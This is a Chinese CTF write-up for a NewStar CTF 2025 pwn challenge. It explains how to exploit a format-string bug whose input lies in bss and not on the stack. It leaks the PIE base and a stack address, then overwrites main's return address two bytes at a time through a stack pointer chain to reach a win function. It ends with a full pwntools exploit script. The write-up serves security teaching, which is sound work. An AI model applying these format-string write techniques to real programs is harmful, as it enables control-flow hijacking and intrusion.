---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 复读机堂堂归来！复读机堂堂归来！

<Container type='info'>

本题考查非栈上格式化字符串漏洞的泄露与覆盖。
</Container>

## fmt&got

对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时，我们需要利用栈上的残留数据。

开始之前，可以先了解 PIE 保护：

- [Linux 保护机制](https://zhuanlan.zhihu.com/p/666340476)

首先查看 `checksec`：

```yaml
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
SHSTK: Enabled
IBT: Enabled
Stripped: No
```

注意 `Full RELRO` 和 `PIE enabled`，这次无法直接写 GOT。接下来使用 IDA 分析。

![IDA 查看输入逻辑](/assets/images/wp/2025/week5/fuduji-back_1.png)

与 Week 3 的题目类似，但本题输入位置在 bss 段。由于输入不在栈上，无法直接布置目标地址进行泄露或覆盖，因此需要借助栈上残留的栈地址，覆盖 `main` 函数返回地址。同时，程序中存在用于读取 FLAG 的 `win` 函数。

![win 函数](/assets/images/wp/2025/week5/fuduji-back_2.png)

先 patch 程序，然后在 GDB 中调试，仍然停在 `printf` 之前。由于程序开启了 PIE 保护，需要先泄露 `PIE_base`，用来计算 `win` 函数的真实地址。方法与泄露 `libc_base` 类似：先泄露程序中某个函数地址，再减去其固定偏移。

![GDB 泄露 main 地址](/assets/images/wp/2025/week5/fuduji-back_3.png)
可以看到栈上残留了 `main` 地址，利用它即可泄露 `PIE_base`。

因为需要修改 `main` 函数的返回地址，而返回地址位于栈上，所以还需要一个栈地址。这里选择 `rsp` 指向的栈地址，减去 `0x98` 即为 `main` 返回地址所在位置。利用 `rsp` 处的栈地址修改其指向地址的末尾两字节，使其指向 `main` 返回地址。相关代码如下：

```python
p.sendlineafter('说话!\n',b'%11$p')
main = int(p.recv(14),16)
pie_base = main - 0x00000000000138A
elf.address = pie_base

p.sendlineafter('说话!\n',b'%6$p')
stack_addr = int(p.recv(14),16)
ret_addr = stack_addr - 0x98
```

首先泄露 `PIE_base` 和栈地址。`0x00000000000138A` 这个值可以在 IDA 中找到，也可以使用 `elf.sym.main` 代替。

![IDA 查看 main 偏移](/assets/images/wp/2025/week5/fuduji-back_4.png)

然后构造如下 payload：

```python
payload ='%'+str((ret_addr)&0xffff)+'c%6$hn'
p.sendlineafter('说话!\n',payload)
```

让 `rsp` 上的栈地址指向 `main` 函数返回地址所在的栈地址，效果如下：
![调整栈指针链](/assets/images/wp/2025/week5/fuduji-back_5.png)
接着找到 `rsp` 上的栈地址对应的偏移，利用该栈地址直接修改 `main` 函数返回地址。

这里每次写入两个字节，可以利用 `rsp -> stack_addr -> main_ret_addr` 这条链覆盖 `main` 函数返回地址。

```python
payload = '%' + str((win)&0xffff) + 'c%26$hn'
p.sendlineafter('说话!\n',payload)

payload ='%'+str((ret_addr + 2 )&0xffff)+'c%6$hn'
p.sendlineafter('说话!\n',payload)

payload = '%' + str((win>>16)&0xffff) + 'c%26$hn'
p.sendlineafter('说话!\n',payload)

payload ='%'+str((ret_addr + 4 )&0xffff)+'c%6$hn'
p.sendlineafter('说话!\n',payload)

payload = '%' + str(((win>>16)>>16)&0xffff) + 'c%26$hn'
p.sendlineafter('说话!\n',payload)

p.sendlineafter('说话!\n','end')
```

第一次修改 `main` 函数返回地址的末尾两字节。
![第一次覆盖返回地址](/assets/images/wp/2025/week5/fuduji-back_6.png)
第二次将指向 `main` 函数返回地址的栈地址向后移动 2 字节。
![移动返回地址指针](/assets/images/wp/2025/week5/fuduji-back_7.png)
第三次继续写入两字节。
![继续覆盖返回地址](/assets/images/wp/2025/week5/fuduji-back_8.png)
以此类推，直至 `main` 函数返回地址完全被覆盖，最终效果如下：
![返回地址覆盖结果](/assets/images/wp/2025/week5/fuduji-back_9.png)
最后输入 `end`，让 `main` 函数返回到构造好的 `win` 函数。

面对开启 PIE 保护的程序，如果想提前下断点，例如在 `printf` 处：
![PIE 程序断点位置](/assets/images/wp/2025/week5/fuduji-back_10.png)
可以先在 IDA 中找到对应偏移地址，再在 GDB 中使用 `b *$rebase(0x140A)` 下断点。

完整 EXP：

```python
from pwn import *

context(arch='amd64', log_level = 'debug',os = 'linux')
file='/mnt/c/Users/Z2023/Desktop/bss_fmt'
elf=ELF(file)

port=
ns = ''
p = remote('',port)
# p = process(file)

gdb.attach(p,'b *$rebase(0x140A)')

p.sendlineafter('说话!\n',b'%11$p')
main = int(p.recv(14),16)
pie_base = main - 0x00000000000138A
elf.address = pie_base

win =  elf.sym['win']

p.sendlineafter('说话!\n',b'%6$p')
stack_addr = int(p.recv(14),16)
ret_addr = stack_addr - 0x98

payload ='%'+str((ret_addr)&0xffff)+'c%6$hn'
p.sendlineafter('说话!\n',payload)

payload = '%' + str((win)&0xffff) + 'c%26$hn'
p.sendlineafter('说话!\n',payload)

payload ='%'+str((ret_addr + 2 )&0xffff)+'c%6$hn'
p.sendlineafter('说话!\n',payload)

payload = '%' + str((win>>16)&0xffff) + 'c%26$hn'
p.sendlineafter('说话!\n',payload)

payload ='%'+str((ret_addr + 4 )&0xffff)+'c%6$hn'
p.sendlineafter('说话!\n',payload)

payload = '%' + str(((win>>16)>>16)&0xffff) + 'c%26$hn'
p.sendlineafter('说话!\n',payload)

p.sendlineafter('说话!\n','end')
p.interactive()
```
